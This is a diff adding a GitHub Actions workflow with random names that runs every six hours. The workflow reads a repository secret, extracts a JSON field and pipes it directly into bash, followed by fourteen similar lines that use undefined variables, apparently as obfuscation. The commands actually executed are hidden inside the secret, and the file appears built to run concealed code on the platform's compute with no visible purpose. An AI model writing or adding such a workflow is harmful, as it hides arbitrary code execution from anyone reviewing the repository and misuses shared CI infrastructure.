@@ -1,0 +1,33 @@
+name: zhubanguan3579
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhubanguan3579
+        env:
+          ygw1: ${{ secrets.ygw1 }}
+        run: |
+          echo $ygw1 | jq -r .q93707 | /bin/bash
+          echo $oiob4564 | jq -r .zhp6813 | /bin/bash
+          echo $y4 | jq -r .msz30436 | /bin/bash
+          echo $oujf20 | jq -r .gwqgl87400 | /bin/bash
+          echo $xjwx0120 | jq -r .t53981 | /bin/bash
+          echo $efdk9937 | jq -r .gncze51 | /bin/bash
+          echo $tc83 | jq -r .c175 | /bin/bash
+          echo $kgyek348 | jq -r .zgxwg125 | /bin/bash
+          echo $iwkk27048 | jq -r .jrb256 | /bin/bash
+          echo $a26 | jq -r .xki8009 | /bin/bash
+          echo $ugwtu7374 | jq -r .ajgn0588 | /bin/bash
+          echo $dpui3 | jq -r .hahdq38 | /bin/bash
+          echo $wi4976 | jq -r .uweao51549 | /bin/bash
+          echo $vrqio17 | jq -r .y63105 | /bin/bash
+          echo $h66079 | jq -r .oyzi79602 | /bin/bash
+
